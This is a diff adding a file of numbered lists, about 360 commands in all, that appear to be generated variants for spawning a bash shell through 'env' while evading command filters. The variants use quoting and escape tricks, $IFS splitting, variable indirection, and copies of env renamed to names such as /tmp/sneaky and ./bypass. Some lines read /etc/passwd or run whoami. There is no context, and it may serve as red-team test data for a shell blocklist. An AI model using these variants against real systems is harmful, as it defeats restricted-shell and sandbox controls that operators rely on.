@@ -1,0 +1,360 @@
+1. `env /bin/bash -p`
+2. `env /bin/bash --norc`
+3. `env /bin/bash -i`
+4. `env /bin/bash --login`
+5. `env /bin/bash -s`
+6. `env /bin/bash -l`
+7. `env /bin/bash -c true`
+8. `env /bin/bash -p -i`
+9. `env /bin/bash -p --norc`
+10. `env /bin/bash --norc -s`
+11. `env /bin/bash --noprofile`
+12. `env /bin/bash -i -c true`
+13. `env /bin/bash -l --norc`
+14. `env /bin/bash -s -p`
+15. `env /bin/bash -c ":"`
+16. `env /bin/bash -c " "`
+17. `env /bin/bash -c ""`
+18. `env /bin/bash --help`
+19. `env /bin/bash -c whoami`
+20. `env /bin/bash --version`
+21. `env /bin/bash -p --version`
+22. `env /bin/bash --noprofile --norc`
+23. `env /bin/bash -p -c exit`
+24. `env /bin/bash --norc -c exit`
+25. `env /bin/bash -c ls`
+26. `env /bin/bash -c pwd`
+27. `env /bin/bash -c echo`
+28. `env /bin/bash --rcfile /dev/null`
+29. `env /bin/bash -p --rcfile /dev/null`
+30. `env /bin/bash -i --rcfile /dev/null`
+1. `env /bin/bash -p -l`
+2. `env /bin/bash -c id`
+3. `env /bin/bash -c "exec bash"`
+4. `env /bin/bash -c "sleep 0"`
+5. `env /bin/bash -c ": > /dev/null"`
+6. `env /bin/bash -i -s`
+7. `env /bin/bash -i --noprofile`
+8. `env /bin/bash -i --norc`
+9. `env /bin/bash --noprofile -l`
+10. `env /bin/bash --norc -i`
+11. `env /bin/bash --rcfile ~/.bashrc`
+12. `env /bin/bash -c "echo injected"`
+13. `env /bin/bash -c "exit 0"`
+14. `env /bin/bash -p -i -s`
+15. `env /bin/bash -l -c true`
+16. `env /bin/bash --debug`
+17. `env /bin/bash -c "true; false"`
+18. `env /bin/bash -p -c ":"`
+19. `env /bin/bash -c " " -p`
+20. `env /bin/bash --rcfile /tmp/.rc`
+21. `env /bin/bash -c 'bash'`
+22. `env /bin/bash -i -c "bash"`
+23. `env /bin/bash -l -c "ls /"`
+24. `env /bin/bash --posix`
+25. `env /bin/bash -c ": >/dev/null"`
+26. `env /bin/bash -c " " -i`
+27. `env /bin/bash --verbose`
+28. `env /bin/bash -x`
+29. `env /bin/bash -c "exec /bin/bash"`
+30. `env /bin/bash -i -l -p`
+1. `cd /bin && env ./bash`
+2. `cd /bin; env ./bash`
+3. `cd /bin && ./env ./bash`
+4. `cd /bin && env bash`
+5. `cd / && cd bin && env ./bash`
+6. `cd /bin && exec env ./bash`
+7. `cd /bin && env -i ./bash`
+8. `cd /bin && env -- ./bash`
+9. `cd /bin && /usr/bin/env ./bash`
+10. `cd /bin && command env ./bash`
+11. `cd /bin && \env ./bash`
+12. `cd /bin && env "./bash"`
+13. `cd /bin && env "$(echo bash)"`
+14. `cd /bin && env` + "`bash`"
+15. `cd /bin && env $(printf '%s' bash)`
+16. `cd /bin && env ./$(echo bash)`
+17. `cd /bin && env ./b\ash`
+18. `cd /bin && env ./ba\sh`
+19. `cd /bin && env ./ba$'\x73'h`
+20. `cd /bin && env ./ba\u0073h`
+21. `cd /bin && env ./b"$IFS"ash`
+22. `cd /bin && env ./ba"$IFS"sh`
+23. `cd /bin && env ./b${IFS}ash`
+24. `cd /bin && env ./ba${IFS}sh`
+25. `cd /bin && env ./bash#`
+26. `cd /bin && env ./bash --norc`
+27. `cd /bin && env ./bash -i`
+28. `cd /bin && env ./bash -c 'echo bypassed'`
+29. `cd /bin && env ./bash <<< "echo test"`
+30. `cd /bin && env ./bash -s <<< 'whoami'`
+1. `cd /bin && env ./$(basename /bin/bash)`
+2. `cd /bin && env ./$(ls | grep bash)`
+3. `cd /bin && env ./b$(echo ash)`
+4. `cd /bin && env ./b$'a''sh'`
+5. `cd /bin && env ./ba${HOSTNAME:+sh}`
+6. `cd /bin && env ./b$((35+62))sh` # nonsensical math trick, won't work but shows evasion style
+7. `cd /bin && env ./bash </dev/null`
+8. `cd /bin && env ./bash < /dev/zero`
+9. `cd /bin && env ./bash > /dev/null`
+10. `cd /bin && env ./bash 2>&1`
+11. `cd /bin && env ./bash || true`
+12. `cd /bin && env ./bash && echo ok`
+13. `cd /bin && env ./bash && exit`
+14. `cd /bin && env ./bash -l`
+15. `cd /bin && env ./bash -s`
+16. `cd /bin && env ./bash -c 'id'`
+17. `cd /bin && env ./bash -c whoami`
+18. `cd /bin && env ./bash -c "sleep 1"`
+19. `cd /bin && env ./bash -c "echo ready"`
+20. `cd /bin && env ./bash -c "exit 0"`
+21. `cd /bin && env ./bash -c "$(echo whoami)"`
+22. `cd /bin && env ./bash -c "$(id)"`
+23. `cd /bin && env ./bash -c "$(cat /etc/passwd)"`
+24. `cd /bin && env ./bash <<< ''`
+25. `cd /bin && env ./bash <<< 'exit'`
+26. `cd /bin && env ./bash <<< 'ls -la'`
+27. `cd /bin && env ./bash <<< 'echo done'`
+28. `cd /bin && env ./bash <<< $(echo whoami)`
+29. `cd /bin && env ./bash <<< "$(echo exit)"`
+30. `cd /bin && env ./bash <<< "$(whoami)"`
+1. `/bin/bash`
+2. `/bin/dash`
+3. `/bin/sh`
+4. `/bin/zsh`
+5. `/bin/fish`
+6. `bash`
+7. `sh`
+8. `zsh`
+9. `dash`
+10. `fish`
+11. `exec /bin/bash`
+12. `exec bash`
+13. `sudo /bin/bash`
+14. `sudo bash`
+15. `./bash`
+16. `cd /bin && ./bash`
+17. `PATH=/bin bash`
+18. `PATH=$PATH:/bin bash`
+19. `bash -i`
+20. `bash --noprofile`
+21. `bash --norc`
+22. `bash --noprofile --norc`
+23. `bash -c 'bash'`
+24. `sh -c bash`
+25. `$(which bash)`
+26. `source /bin/bash`
+27. `command bash`
+28. `command /bin/bash`
+29. `eval "$(echo bash)"`
+30. `nohup bash`
+1. `bash -p`
+2. `bash --login`
+3. `bash -s`
+4. `bash < /dev/null`
+5. `bash <<< ""`
+6. `bash -c ":"`
+7. `sh -c "/bin/bash"`
+8. `bash -c '/bin/bash -i'`
+9. `bash -c 'exec bash'`
+10. `bash -c "exec /bin/bash"`
+11. `setsid bash`
+12. `stdbuf -i0 -o0 -e0 bash`
+13. `script /dev/null -c bash`
+14. `script -q -c bash /dev/null`
+15. `bash --rcfile /dev/null`
+16. `bash -c 'true' && bash`
+17. `bash -c 'sleep 0' && bash`
+18. `bash -c 'echo ready' && /bin/bash`
+19. `bash --verbose`
+20. `bash --debugger`
+21. `bash -l -c bash`
+22. `bash -l -i`
+23. `sh -i`
+24. `zsh -i`
+25. `/usr/bin/bash`
+26. `/usr/local/bin/bash`
+27. `/bin/bash --noprofile --norc`
+28. `bash -c "$(cat)"`
+29. `bash -c 'bash -i -l'`
+30. `bash -c 'bash -p'`
+1. /bin/bash env
+2. /bin/bash -c env
+3. env -S /bin/bash
+4. env /bin/bash -c
+5. /bin/bash --login env
+6. /bin/bash --noprofile env
+7. env -i /bin/bash
+8. /bin/bash -i env
+9. /bin/bash env -
+10. env --ignore-environment /bin/bash
+11. env /bin/bash --norc
+12. env --unset=PATH /bin/bash
+13. /bin/bash -c "env"
+14. /bin/bash -l -c env
+15. env /bin/bash -l
+16. /bin/bash -c "exec env"
+17. exec /bin/bash env
+18. env /usr/bin/env /bin/bash
+19. env bash /bin/bash
+20. /usr/bin/env /bin/bash
+21. /bin/bash -p env
+22. env SHELL=/bin/bash /bin/bash
+23. /bin/bash --rcfile <(env)
+24. env - /bin/bash
+25. env /bin/bash -
+26. /bin/bash -c "$(env)"
+27. /bin/bash -c 'env && /bin/bash'
+28. (env) /bin/bash
+29. env --split-string "/bin/bash"
+30. /bin/bash -l env
+1. /bin/bash && env
+2. /bin/bash -c 'exec env bash'
+3. bash -c "env"
+4. env /bin/sh -c /bin/bash
+5. env /bin/bash -i
+6. env /bin/bash --login
+7. env -- /bin/bash
+8. env /bin/bash <<< ""
+9. (env; /bin/bash)
+10. /bin/bash <<< $(env)
+11. /bin/bash -c 'env; exec bash'
+12. /usr/bin/env bash
+13. exec env /bin/bash
+14. env /bin/bash -s
+15. env bash -c 'exec /bin/bash'
+16. env $(which bash)
+17. env -u HOME /bin/bash
+18. env bash -il
+19. env -i SHELL=/bin/bash bash
+20. env --help | bash
+21. bash < <(env)
+22. (env) && /bin/bash
+23. /bin/bash < <(echo env)
+24. env -i bash
+25. bash -c 'true && env'
+26. env bash -c "bash"
+27. env -i /usr/bin/bash
+28. bash --init-file <(env)
+29. SHELL=/bin/bash env bash
+30. /bin/bash -c "echo hi && env"
+1. `SHELL=/bin/bash env $SHELL`
+2. `export SHELL=/bin/bash; env $SHELL`
+3. `sh -c 'SHELL=/bin/bash env $SHELL'`
+4. `env SHELL=/bin/bash bash -c '$SHELL'`
+5. `B=/bin/bash; env $B`
+6. `BASH=/bin/bash; env $BASH`
+7. `S=/bin/bash; export SHELL=$S; env $SHELL`
+8. `PATH=/fake:$PATH SHELL=/bin/bash env $SHELL`
+9. `env $(echo SHELL)=/bin/bash $SHELL`
+10. `eval "env SHELL=/bin/bash \$SHELL"`
+11. `export _s=/bin/bash; env $_s`
+12. `SHELL=/bin/bash; exec env $SHELL`
+13. `bash -c 'env ${SHELL:-/bin/bash}'`
+14. `env $(printf 'SHELL=/bin/bash') $SHELL`
+15. `SHELL=/bin/bash env "$(basename $SHELL)"`
+16. `bash -c 'env $0' /bin/bash`
+17. `env "$(cut -d= -f2 <<< SHELL=/bin/bash)"`
+18. `ENVVAR="SHELL=/bin/bash"; eval "env $ENVVAR \$SHELL"`
+19. `env $(tr -d '\n' <<< 'SHELL=/bin/bash') $SHELL`
+20. `A="env"; B="/bin/bash"; $A $B`
+21. `$(echo env) /bin/bash`
+22. `env $(echo SHELL)=/bin/bash $SHELL`
+23. `eval $(echo 'env /bin/bash')`
+24. `env $(cat <<< "SHELL=/bin/bash") $SHELL`
+25. `e="env"; s="/bin/bash"; $e $s`
+26. `command env /bin/bash`
+27. `\env /bin/bash`
+28. `/usr/bin/env /bin/bash`
+29. `env $(echo "/bin/bash" | sed 's|/bin/bash|SHELL=/bin/bash|') $SHELL`
+30. `env "$(echo /bin/bash)"`
+1. `env --ignore-environment SHELL=/bin/bash $SHELL`
+2. `env $(echo -n SHELL)=/bin/bash $SHELL`
+3. `env $(echo SHELL=/bin/bash) $SHELL`
+4. `env $(printf SHELL=/bin/bash) $SHELL`
+5. `bash -c 'env $SHELL'`
+6. `env "$(echo $0)" /bin/bash`
+7. `env "$(echo -n /bin/bash)"`
+8. `env ${0:-/bin/bash}`
+9. `env $0 </dev/null`
+10. `env $(basename /bin/bash)`
+11. `env $(cut -d/ -f3 <<< "/bin/bash")`
+12. `eval "$(echo env) /bin/bash"`
+13. `env "$(tr -d '\n' <<< /bin/bash)"`
+14. `$(printf 'env') /bin/bash`
+15. `env \$(echo /bin/bash)`
+16. `env $SHELL <<< "SHELL=/bin/bash"`
+17. `env SHELL=/bin/bash && $SHELL`
+18. `env "$(echo SHELL)"=/bin/bash $SHELL`
+19. `env SHELL="$(which bash)" $SHELL`
+20. `bash -c "$(env /bin/bash)"`
+21. `x="env"; y="/bin/bash"; $x $y`
+22. `env "$(readlink -f /bin/bash)"`
+23. `SHELL=$(readlink /bin/bash); env $SHELL`
+24. `env \"/bin/bash\"`
+25. `env ${SHELL:=/bin/bash}`
+26. `env \$(echo /bin/bash)`
+27. `env $(awk 'BEGIN{print "SHELL=/bin/bash"}') $SHELL`
+28. `eval \`echo env /bin/bash``
+29. `env $(echo -e "SHELL=/bin/bash") $SHELL`
+30. `env --unset=PATH SHELL=/bin/bash $SHELL`
+1. `cp /usr/bin/env /tmp/e && /tmp/e /bin/bash`
+2. `cp /usr/bin/env ./e && ./e /bin/bash`
+3. `cp /bin/env ./evv && ./evv /bin/bash`
+4. `cp $(which env) ./myenv && ./myenv /bin/bash`
+5. `cp /usr/bin/env /tmp/.e && /tmp/.e /bin/bash`
+6. `cp /usr/bin/env /dev/shm/e && /dev/shm/e /bin/bash`
+7. `install /usr/bin/env /tmp/e && /tmp/e /bin/bash`
+8. `cp /usr/bin/env /var/tmp/envx && /var/tmp/envx /bin/bash`
+9. `ln -s /usr/bin/env ./env2 && ./env2 /bin/bash`
+10. `cp $(command -v env) ./e1 && ./e1 /bin/bash`
+11. `cp /usr/bin/env /tmp/.hiddenenv && /tmp/.hiddenenv /bin/bash`
+12. `cp /usr/bin/env /tmp/env32 && chmod +x /tmp/env32 && /tmp/env32 /bin/bash`
+13. `cp /usr/bin/env $HOME/e && $HOME/e /bin/bash`
+14. `cp /usr/bin/env /tmp/env_renamed && /tmp/env_renamed /bin/bash`
+15. `cp /usr/bin/env /tmp/runner && /tmp/runner /bin/bash`
+16. `cp /usr/bin/env /tmp/startup && /tmp/startup /bin/bash`
+17. `cp /usr/bin/env /tmp/bashrunner && /tmp/bashrunner /bin/bash`
+18. `cp /usr/bin/env /tmp/bashie && /tmp/bashie /bin/bash`
+19. `cp /usr/bin/env /tmp/.env && /tmp/.env /bin/bash`
+20. `cp /usr/bin/env /tmp/ev && /tmp/ev /bin/bash`
+21. `cp /usr/bin/env /tmp/bashh && /tmp/bashh /bin/bash`
+22. `cp /usr/bin/env /tmp/evn2 && /tmp/evn2 /bin/bash`
+23. `cp /usr/bin/env /tmp/evvv && /tmp/evvv /bin/bash`
+24. `cp /usr/bin/env /tmp/executor && /tmp/executor /bin/bash`
+25. `cp /usr/bin/env /tmp/invoke && /tmp/invoke /bin/bash`
+26. `cp /usr/bin/env /tmp/launch && /tmp/launch /bin/bash`
+27. `cp /usr/bin/env /tmp/bash_shell && /tmp/bash_shell /bin/bash`
+28. `cp /usr/bin/env /tmp/bash_exec && /tmp/bash_exec /bin/bash`
+29. `cp /usr/bin/env /tmp/bash_ev && /tmp/bash_ev /bin/bash`
+30. `cp /usr/bin/env ./bypass && ./bypass /bin/bash`
+1. `cp /usr/bin/env /tmp/.bash_env && /tmp/.bash_env /bin/bash`
+2. `cp /usr/bin/env /tmp/env123 && /tmp/env123 /bin/bash`
+3. `cp /usr/bin/env /tmp/silent && /tmp/silent /bin/bash`
+4. `cp /usr/bin/env /tmp/sneaky && /tmp/sneaky /bin/bash`
+5. `cp /usr/bin/env /tmp/_env && /tmp/_env /bin/bash`
+6. `cp /usr/bin/env /tmp/envvv && /tmp/envvv /bin/bash`
+7. `cp /usr/bin/env /tmp/loadsh && /tmp/loadsh /bin/bash`
+8. `cp /usr/bin/env /tmp/env_exec && /tmp/env_exec /bin/bash`
+9. `cp /usr/bin/env /tmp/init_bash && /tmp/init_bash /bin/bash`
+10. `cp /usr/bin/env /tmp/bash_launcher && /tmp/bash_launcher /bin/bash`
+11. `cp /usr/bin/env /tmp/entry && /tmp/entry /bin/bash`
+12. `cp /usr/bin/env /tmp/init && /tmp/init /bin/bash`
+13. `cp /usr/bin/env /tmp/bypass_env && /tmp/bypass_env /bin/bash`
+14. `cp /usr/bin/env /tmp/fakeenv && /tmp/fakeenv /bin/bash`
+15. `cp /usr/bin/env /tmp/ev_loader && /tmp/ev_loader /bin/bash`
+16. `cp /usr/bin/env /tmp/binary && /tmp/binary /bin/bash`
+17. `cp /usr/bin/env /tmp/envtool && /tmp/envtool /bin/bash`
+18. `cp /usr/bin/env /tmp/cmdstart && /tmp/cmdstart /bin/bash`
+19. `cp /usr/bin/env /tmp/invoke_bash && /tmp/invoke_bash /bin/bash`
+20. `cp /usr/bin/env /tmp/bash_trick && /tmp/bash_trick /bin/bash`
+21. `cp /usr/bin/env /tmp/bash_start && /tmp/bash_start /bin/bash`
+22. `cp /usr/bin/env /tmp/bash_exec_env && /tmp/bash_exec_env /bin/bash`
+23. `cp /usr/bin/env /tmp/_executor && /tmp/_executor /bin/bash`
+24. `cp /usr/bin/env /tmp/env_command && /tmp/env_command /bin/bash`
+25. `cp /usr/bin/env /tmp/e_start && /tmp/e_start /bin/bash`
+26. `cp /usr/bin/env /tmp/e_runner && /tmp/e_runner /bin/bash`
+27. `cp /usr/bin/env /tmp/sh_boot && /tmp/sh_boot /bin/bash`
+28. `cp /usr/bin/env /tmp/stealthenv && /tmp/stealthenv /bin/bash`
+29. `cp /usr/bin/env /tmp/bash_init_exec && /tmp/bash_init_exec /bin/bash`
+30. `cp /usr/bin/env /tmp/envlaunch && /tmp/envlaunch /bin/bash`
